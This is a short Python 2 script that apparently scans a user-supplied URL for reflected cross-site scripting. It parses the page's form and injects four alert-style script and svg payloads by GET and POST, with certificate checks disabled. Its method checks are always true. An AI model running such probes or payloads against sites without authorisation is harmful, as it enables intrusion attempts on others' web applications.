#!/usr/bin/python
#-*- coding:utf-8 -*-
import requests,re,sys
import urllib3
urllib3.disable_warnings()

def req(url,xss):
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0'
    }
    if method[0] == 'get' or 'GET':
        req = requests.get(url=url+"?"+name[0]+"="+xss,headers=headers,verify=False,timeout=3)
        print u"正在测试",url,xss
        if xss in req.content:
            print "[+]Find Get Xss url:%s    payload:%s"%(url,xss)
            sys.exit(1)
    if method[0] == 'post' or 'POST':
        data={name[0]:xss}
        req = requests.post(url=url,data=data,headers=headers,verify=False,timeout=3)
        print u"正在测试",url,xss
        if xss in req.content:
            print "[+]Find Post Xss url:%s    payload:%s"%(url,xss)
            sys.exit(1)

def html(url):
    global method,name
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0'
    }
    req = requests.get(url,headers=headers,verify=False,timeout=3)
    r =r'<form.*</form>'
    form = re.findall(r,req.content,re.S)
    method=re.findall(r'method="(.*?)"',str(form))
    name = re.findall(r'name="(.*?)"', str(form))
    try:
        if method==None or name==None:
            sys.exit(0)
        else:
            print u"\nFind method = %s    name = %s\n"%(method[0],name[0])
    except:
        print u"\n自动分析失败!"
        sys.exit(0)


if __name__ == '__main__':
    url = raw_input('\nurl:')
    if 'http' not in url:
        url = 'http://'+url
    xss = ["<script>alert('XSS')</script>",
           "%3Cscript%3Ealert('XSS')%3C/script%3E",
           '"><sc<script>ript>alert(/xss/)</script>',
           "<svg onload=alert(/1/)>"
           ]

    html(url)
    for x in xss:
        req(url,x)